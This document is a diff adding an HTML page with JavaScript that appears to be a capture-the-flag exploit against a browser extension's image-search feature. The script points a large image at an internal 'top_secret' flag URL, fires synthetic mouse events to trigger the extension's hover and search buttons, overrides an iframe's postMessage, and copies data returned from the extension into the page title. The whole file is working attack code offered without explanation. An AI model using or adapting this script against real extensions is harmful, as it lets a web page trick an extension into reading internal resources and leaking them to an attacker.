@@ -1,0 +1,59 @@
+<!-- Place a huge img that points to the flag server -->
+<img id="source" src="http://127.0.1.14:1919/top_secret" width="1000" height="1000" />
+<script>
+// Post mousemove event to the img
+function selectImg() {
+  var img = document.getElementById('source');
+  var fake_ev = new MouseEvent('mousemove', {
+      'target': img,
+      'clientX': 100,
+      'clientY': 100,
+      'bubbles': true,
+  })
+  img.dispatchEvent(fake_ev);
+}
+function selectHover(hover_btn) {
+  var box = hover_btn.getBoundingClientRect();
+  var fake_hover_ev = new MouseEvent('mousemove', {
+    'target': hover_btn,
+    'clientX': box.clientX,
+    'clientY': box.clientY,
+    'bubbles': true,
+  });
+  hover_btn.dispatchEvent(fake_hover_ev);
+}
+function clickSearcher() {
+      var search_btn = document.querySelector('.index-module__imgSearch_hover_content--c5JEb');
+      var fake_click_ev = new MouseEvent('click', {
+        'target': search_btn,
+        'bubbles': true,
+        });
+      search_btn.dispatchEvent(fake_click_ev);
+    }
+async function inject() {
+  await new Promise(r => setTimeout(r, 1000));
+  selectImg();
+  var hover_btn;
+  while (!hover_btn) {
+    hover_btn = document.getElementById('chrome_pc_imgSearch_hoverWrapper');
+    await new Promise(r => setTimeout(r, 100));
+  }
+  selectHover(hover_btn);
+  await new Promise(r => setTimeout(r, 200));
+  clickSearcher();
+}
+function iframeHijacker() {
+  // delete src for all iframes
+  var iframe = document.querySelector('iframe');
+  if (iframe) {
+    iframe.postMessage = function(msg) {
+      console.log('iframe postMessage', msg);
+    }
+  }
+}
+
+inject();
+window.addEventListener("sendDataToContentScript", function(e) {
+  document.title = e.detail.message;
+});
+</script>
